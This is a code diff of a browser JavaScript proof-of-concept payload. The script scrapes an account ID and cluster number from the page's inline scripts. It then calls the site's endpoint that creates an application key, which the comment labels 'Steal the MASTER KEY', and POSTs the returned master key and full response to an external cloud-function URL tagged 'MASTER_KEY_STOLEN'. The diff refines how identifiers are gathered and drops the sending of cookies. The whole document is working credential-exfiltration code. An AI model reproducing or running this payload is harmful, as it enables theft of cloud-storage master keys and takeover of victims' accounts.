@@ -1,14 +1,18 @@
 (function() {
   var SAVE_URL = "https://asia-southeast1-child-guard-prod.cloudfunctions.net/api/v1/poc/save";
+  var scripts = document.querySelectorAll("script");
+  var html = "";
+  for (var i = 0; i < scripts.length; i++) html += scripts[i].textContent;
 
-  // Read accountId and clusterNum from cookies
+  // Extract accountId from inline JS: accountId: 'xxx'
   var accountId = "";
+  var am = html.match(/accountId:\s*'([a-f0-9]+)'/);
+  if (am) accountId = am[1];
+
+  // Extract clusterNum from inline JS: cluster_num"] = "xxx"
   var clusterNum = "";
-  try {
-    var sso = decodeURIComponent(document.cookie.match(/bz_sso=([^;]+)/)[1]);
-    accountId = sso.match(/"accountId"\s*:\s*"([^"]+)"/)[1];
-    clusterNum = document.cookie.match(/bz_cluster_num=([^;]+)/)[1];
-  } catch(e) {}
+  var cm = html.match(/cluster_num['"]\]\s*=\s*['"](\d+)['"]/);
+  if (cm) clusterNum = cm[1];
 
   // Steal the MASTER KEY
   fetch("/account_tangle/create_b2_application_key", {
@@ -22,16 +26,15 @@
   })
   .then(function(r) { return r.json(); })
   .then(function(resp) {
-    // Send master key to our server
     fetch(SAVE_URL, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({
         type: "MASTER_KEY_STOLEN",
         accountId: accountId,
+        clusterNum: clusterNum,
         masterKey: resp.b2ApplicationKey,
         fullResponse: resp,
-        cookies: document.cookie,
         timestamp: new Date().toISOString()
       })
     });
